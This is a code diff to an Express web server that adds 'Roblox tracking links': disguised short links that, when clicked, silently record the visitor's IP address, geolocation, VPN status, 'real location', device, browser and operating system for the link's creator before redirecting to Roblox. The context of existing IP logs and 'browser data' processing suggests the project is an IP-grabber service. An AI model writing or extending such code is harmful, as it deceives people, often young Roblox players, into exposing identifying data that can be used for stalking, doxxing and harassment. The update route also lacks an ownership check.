@@ -1,7 +1,7 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema } from "@shared/schema";
+import { insertIpLogSchema, insertSettingsSchema, insertUserSchema, insertAccessKeySchema, updateProfileSchema, updatePasswordSchema, createRobloxLinkSchema } from "@shared/schema";
 import path from "path";
 import fs from "fs";
 import multer from "multer";
@@ -1655,6 +1655,134 @@ export async function registerRoutes(app: Express): Promise<Server> {
     } catch (error) {
       console.error('Error processing browser data:', error);
       res.status(500).json({ error: 'Failed to process data' });
+    }
+  });
+
+  // Roblox Link API endpoints
+  
+  // Create a new Roblox tracking link
+  app.post('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const validatedData = createRobloxLinkSchema.parse(req.body);
+      
+      // Generate a unique tracking ID
+      const trackingId = randomUUID().substring(0, 8);
+      
+      const robloxLink = await storage.createRobloxLink({
+        userId: req.user.id,
+        originalUrl: validatedData.originalUrl,
+        linkType: validatedData.linkType,
+        trackingId,
+        title: validatedData.title,
+        description: validatedData.description
+      });
+      
+      res.json({
+        ...robloxLink,
+        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${trackingId}`
+      });
+    } catch (error) {
+      console.error('Roblox link creation error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Get all Roblox links for the current user
+  app.get('/api/roblox-links', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const links = await storage.getRobloxLinks(req.user.id);
+      const linksWithTrackingUrls = links.map(link => ({
+        ...link,
+        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${link.trackingId}`
+      }));
+      res.json(linksWithTrackingUrls);
+    } catch (error) {
+      console.error('Roblox links fetch error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Update a Roblox link
+  app.put('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const { id } = req.params;
+      const updates = req.body;
+      
+      const updatedLink = await storage.updateRobloxLink(id, updates);
+      if (!updatedLink) {
+        return res.status(404).json({ error: 'Link not found' });
+      }
+      
+      res.json({
+        ...updatedLink,
+        trackingUrl: `${req.protocol}://${req.get('host')}/roblox/${updatedLink.trackingId}`
+      });
+    } catch (error) {
+      console.error('Roblox link update error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Delete a Roblox link
+  app.delete('/api/roblox-links/:id', authenticateUser, async (req: Request, res: Response) => {
+    try {
+      const { id } = req.params;
+      const deleted = await storage.deleteRobloxLink(id, req.user.id);
+      
+      if (!deleted) {
+        return res.status(404).json({ error: 'Link not found or unauthorized' });
+      }
+      
+      res.json({ success: true });
+    } catch (error) {
+      console.error('Roblox link deletion error:', error);
+      res.status(500).json({ error: 'Internal server error' });
+    }
+  });
+
+  // Roblox link tracking and redirection endpoint
+  app.get('/roblox/:trackingId', async (req: Request, res: Response) => {
+    try {
+      const { trackingId } = req.params;
+      
+      // Get the Roblox link
+      const robloxLink = await storage.getRobloxLink(trackingId);
+      if (!robloxLink || !robloxLink.isActive) {
+        return res.status(404).send('Link not found or inactive');
+      }
+
+      // Log the visitor information (similar to existing IP logging)
+      const ip = getClientIp(req);
+      const userAgent = req.headers['user-agent'] || '';
+      const referrer = req.headers.referer || '';
+      const locationData = getLocationFromIp(ip);
+      const deviceInfo = parseUserAgent(userAgent);
+
+      // Create IP log entry
+      await storage.createIpLog({
+        userId: robloxLink.userId,
+        ipAddress: ip,
+        userAgent,
+        referrer,
+        location: locationData.location,
+        isVpn: locationData.isVpn,
+        vpnLocation: locationData.vpnLocation,
+        realLocation: locationData.realLocation,
+        deviceType: deviceInfo.deviceType,
+        browserName: deviceInfo.browserName,
+        operatingSystem: deviceInfo.operatingSystem,
+        deviceBrand: deviceInfo.deviceBrand,
+        status: 'roblox_redirect'
+      });
+
+      // Update click count
+      await storage.updateRobloxLinkClicks(trackingId);
+
+      // Redirect to the original Roblox URL
+      res.redirect(robloxLink.originalUrl);
+    } catch (error) {
+      console.error('Roblox redirect error:', error);
+      res.status(500).send('Internal server error');
     }
   });
 
